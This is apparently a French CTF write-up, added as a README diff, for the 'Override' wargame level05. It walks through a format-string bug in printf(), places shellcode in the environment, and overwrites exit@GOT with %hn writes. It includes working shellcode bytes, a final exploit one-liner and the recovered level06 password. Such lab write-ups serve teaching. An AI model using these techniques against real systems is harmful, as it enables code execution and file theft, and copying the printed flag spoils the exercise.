@@ -1,0 +1,197 @@
+# 📘 Override – Level05
+
+## 📝 Description
+
+Ce niveau introduit une vulnérabilité **format string** dans un programme qui lit une chaîne de l’utilisateur, modifie certains caractères, puis la passe directement à `printf()` sans spécifier de format.
+
+Le but est de détourner le flux d’exécution pour récupérer le mot de passe du niveau suivant.
+
+---
+
+## 🔍 Analyse du binaire
+
+Le programme lit une chaîne dans `local_78`, puis effectue une modification sur chaque caractère :
+
+```c
+fgets(local_78, 100, stdin);
+
+if (('@' < local_78[i]) && (local_78[i] < '[')) {
+    local_78[i] = local_78[i] ^ 0x20;   // A–Z converties en minuscules
+}
+```
+
+Enfin :
+
+```c
+printf((char *)local_78);   // ⚠️ Vulnerabilité format-string
+exit(0);
+```
+
+### Problèmes du programme
+
+#### 1️⃣ **Format String Vulnerability**
+
+`printf(local_78)` fait interpréter l’entrée utilisateur comme un format :
+
+```
+%p %x %n %s ...
+```
+
+→ On peut **lire la mémoire**, **fuiter des adresses**,
+et surtout **écrire à une adresse arbitraire** via `%n`, `%hn`, `%hhn`.
+
+#### 2️⃣ Transformation des majuscules
+
+Toute lettre ASCII entre `A` et `Z` est modifiée :
+
+```
+'A' (0x41) → 0x61 ('a')
+'B' (0x42) → 0x62 ('b')
+...
+```
+
+Donc le payload doit **éviter les lettres majuscules**.
+
+---
+
+## 🎯 Objectif de l’exploitation
+
+Le binaire appelle :
+
+```c
+exit(0);
+```
+
+Défini dans la Global Offset Table :
+
+```bash
+objdump -R ./level05 | grep exit
+080497e0 R_386_JUMP_SLOT   exit
+```
+
+➡️ Si on écrase `exit@GOT` avec une adresse contrôlée,
+le programme **sautera vers cette adresse** au moment d’appeler `exit()`.
+
+Nous allons donc :
+
+* mettre un **NOP sled + shellcode** dans l’environnement (`SHELLCODE=...`)
+* trouver son adresse exacte en mémoire
+* écraser `exit@GOT` pour qu’il pointe vers ce shellcode
+
+→ Le programme exécutera le shellcode → on lit le `.pass`.
+
+---
+
+## 🧨 Mise en place du shellcode dans l’environnement
+
+### 1️⃣ Ajouter un NOP sled + ton shellcode personnalisé
+
+Ce shellcode lit :
+
+```
+/home/users/level06/.pass
+```
+
+Et l’affiche.
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"')
+```
+
+### 2️⃣ Trouver l’adresse du shellcode
+
+Dans GDB :
+
+```gdb
+(gdb) r
+AAAA
+x/20s *((char**)environ)
+0xffffd794:	 "SHELLCODE=\220
+```
+
+Le NOP sled commence juste après `"SHELLCODE="` :
+
+```
+0xffffd794 + 100 = 0xffffd7f8
+```
+
+---
+
+## 🔧 Exploit Format String
+
+## 📌 Pourquoi ne pas écrire les 4 octets en une fois ?
+
+Lors d’une exploitation Format String, on pourrait être tenté d’utiliser `%n` pour écrire directement les **4 octets** d’une adresse.  
+Cependant, cette approche est rarement viable.
+
+### ❌ Problèmes avec `%n` (écriture 4 octets)
+
+- On doit générer des **valeurs énormes** pour correspondre à une adresse complète de 32 bits  
+  → imprécis et instable
+
+### ✔ Pourquoi utiliser `%hn` (écriture 2 octets)
+
+`%hn` permet d’écrire seulement **un half-word (2 octets)**.  
+C’est beaucoup plus fiable et plus flexible :
+
+- Permet de **séparer l’adresse** en deux parties gérables :
+  - **low** : 2 octets faibles  
+  - **high** : 2 octets hauts
+
+### 🎯 Exemple
+
+Pour écrire l’adresse :
+
+
+
+Nous devons écrire cette adresse dans :
+
+```
+exit@GOT = 0x080497e0
+```
+
+Comme `%hn` écrit un short (2 bytes), on coupe l'adresse :
+
+```
+0xffffd7f8 → high = 0xffff, low = 0xd7f8
+```
+
+Padding calculé :
+
+* low  = 55288
+* high = 65535
+
+Donc le padding pour atteindre 65535 est :
+
+65535 - 55288 = 10247
+
+Final exploit :
+
+```bash
+python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55280d%10\$hn' + '%10247d%11\$hn'" | ./level05
+```
+
+---
+
+## 🏁 Résultat
+
+L’appel à `exit()` saute dans le NOP sled, puis ton shellcode s’exécute et imprime :
+
+```
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
+
+---
+
+## ✅ Résumé
+
+| Élément              | Valeur                                     |
+| -------------------- | ------------------------------------------ |
+| Vulnérabilité        | Format String (`printf(user_input)`)       |
+| Transformation       | XOR 0x20 sur A–Z → éviter les majuscules   |
+| GOT ciblée           | `exit@GOT = 0x080497e0`                    |
+| Payload              | overwrite via `%hn`                        |
+| Shellcode            | placé dans environnement via `$SHELLCODE`  |
+| Adresse utilisée     | `0xffffd7f8` (NOP sled)                    |
+| Exploit final        | One-liner Python                           |
+| Mot de passe level06 | `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq` |
